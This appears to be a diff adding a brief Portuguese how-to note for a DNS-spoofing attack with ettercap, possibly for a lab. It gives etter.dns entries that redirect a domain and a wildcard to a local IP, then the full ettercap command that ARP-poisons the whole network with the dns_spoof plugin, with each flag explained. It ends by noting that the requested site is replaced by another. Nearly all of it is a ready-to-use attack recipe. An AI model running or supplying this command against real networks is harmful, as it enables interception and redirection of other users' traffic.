@@ -1,0 +1,23 @@
+1 - Configurar o arquivo de configuração ETTER.DNS
+1.1 - Caminho: nano /etc/ettercap/etter.dns
+
+Conteudo:
+host1.tsc.example.com   A       192.168.0.197
+*tsc.example.com        A       192.168.0.197
+
+#host2.tsc.example.com   A       192.168.0.198
+#*tsc.example.com        A       192.168.0.198
+
+
+ettercap -T -q -M arp -i wlp6s0 -P dns_spoof ///
+
+ettercap: Comando da ferramenta utilizada.
+-T: Utiliza modo texto.
+-q: Seta o modo silencioso.
+-M arp: Tipo de redirecionamento.
+-i wlp6s0: Interface de rede.
+-P dns_spoof: Plugin utilizado para o ataque.
+/// :  Seleciona toda rede.
+
+Site requisitado: SITE 1
+Site apresentado: SITE 2
